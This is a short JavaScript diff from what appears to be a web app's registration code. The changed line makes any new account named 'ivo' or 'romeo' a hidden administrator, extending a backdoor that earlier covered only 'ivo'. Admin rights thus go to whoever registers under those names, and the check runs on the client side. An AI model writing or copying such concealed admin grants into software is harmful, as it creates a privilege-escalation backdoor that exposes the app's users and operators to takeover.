@@ -656,7 +656,7 @@ function renderAuth(mode){
       }
       const jobTypeSel = card.querySelector('[data-role="jobTypeSelect"]');
       const jobType = jobTypeSel ? jobTypeSel.value : "kueche";
-      const hiddenAdmin = name.toLowerCase() === "ivo";
+      const hiddenAdmin = ["ivo","romeo"].includes(name.toLowerCase());
       await doRegister(name, pass, role, hiddenAdmin, jobType);
     }
   });
